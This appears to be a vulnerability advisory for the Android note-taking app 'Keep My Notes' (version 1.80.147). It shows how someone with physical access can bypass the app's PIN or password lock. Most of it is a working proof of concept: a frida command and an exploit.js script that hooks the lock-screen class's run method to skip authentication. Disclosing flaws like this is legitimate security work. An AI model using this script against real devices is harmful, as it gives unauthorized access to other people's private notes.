## Description

An attacker with physical access to the victim's device can
bypass the application's password/pin lock to access user data.
This is possible due to lack of adequate security controls to
prevent dynamic code manipulation.

## Proof of Concept

It is important to know that for a successful exploitation,
the "Continue" button must be clicked repeatedly.

### Steps to reproduce

1. Install and configure frida as indicated in the following [link](https://programmerclick.com/article/51481638343/).
2. Now just run this command to hook the `run` function so that it
   can be dynamically rewritten to bypass application protection.

   ```bash
   frida -U 'Keep My Notes' -l exploit.js
   ```

3. Now all you have to do is click the "Continue" button 3 or 4 times,
   then close the application and finally open it again.

### System Information

* Package Name: org.whiteglow.keepmynotes
* Application Label: Keep My Notes
* Mobile app version: 1.80.147
* OS: Android 8.0 (API 26)

## Exploit

```js
// exploit.js
Java.perform(() => {
    console.log("[+] Hooking LookScreenActivity - Class f - Method run");
    const LockScreenActivity = Java.use("org.whiteglow.keepmynotes.activity.LockScreenActivity");
    const f = Java.use("org.whiteglow.keepmynotes.activity.LockScreenActivity$f");
    f.run.implementation = () => {
        console.log("Bypass Lock Screen");
        LockScreenActivity.$new().d();
    }
})
```
